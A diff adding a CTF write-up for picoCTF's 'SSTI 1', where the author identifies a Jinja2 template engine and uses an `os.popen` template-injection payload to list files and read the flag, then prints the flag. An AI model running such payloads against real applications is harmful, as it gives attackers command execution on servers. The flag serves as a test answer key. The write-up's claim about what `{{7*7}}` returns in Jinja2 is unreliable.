@@ -78,4 +78,55 @@ https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies (for further re
 
 ***
 
+***
+
+# 3. SSTI 1
+I made a cool website where you can announce whatever you want! Try it out!
+After launching instance: I heard templating is a cool and modular way to build web apps! Check out my website here!
+
+## Solution
+This challenge's hint is the focal point at which we focus on. Looking at the website we get this neat little text box to "announce" whatever we wish.
+
+![](IMAGES/homepage.png "Homepage with textbox for prompts")
+
+Passing the string we get:
+
+![](IMAGES/hi_return.png "Output to random string")
+
+From here I look into some sanity checks and phrases we can use to figure out the server engine. (We can also use curl for this but I wanted to research a little more on web exp.) Passing `{{7*7}}` as a payload, we get:
+
+![](IMAGES/compute_payload.png "Output of template")
+
+This means the payload actually remotely executed code at serverside. This template gives 49 in Twig, 7777777 in Jinja2. 
+Looking into exploitation techniques in jninja2, we get the following template as a payload. 
+
+`{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("ls").read()}}`
+
+Which returns:
+
+![](IMAGES/ls_payload.png "Output of payload, lsing the files in the server")
+
+Okay now we're getting somewhere, let's try catting this flag
+
+`{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("cat flag").read()}}`
+
+We get the flag from this
+
+## Flag: 
+```
+picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dcdca99a}
+```
+
+## Concepts learnt
+This challenge taught us further in how we can identify server engines by a framework of templates, I also learnt a bit of syntax with respect to the `curl` command. Learnt a good chunk on how different payloads affect various engines and how they actually work under the hood.  
+ 
+## Notes
+Here I tried more rudimentary methods to get the flag which were incorrect, took me a while to get to the server side template injection part. I tried a few things from web gauntlet to no avail too. Research into this took longer than expected. Tried simple payloads such as `{{ls}}` which failed.
+
+## References
+https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
+https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection
+https://portswigger.net/research/server-side-template-injection#Identify
+https://pushmetrics.io/learn/jinja/what-is-jinja/
+https://www.geeksforgeeks.org/linux-unix/curl-command-in-linux-with-examples/
 
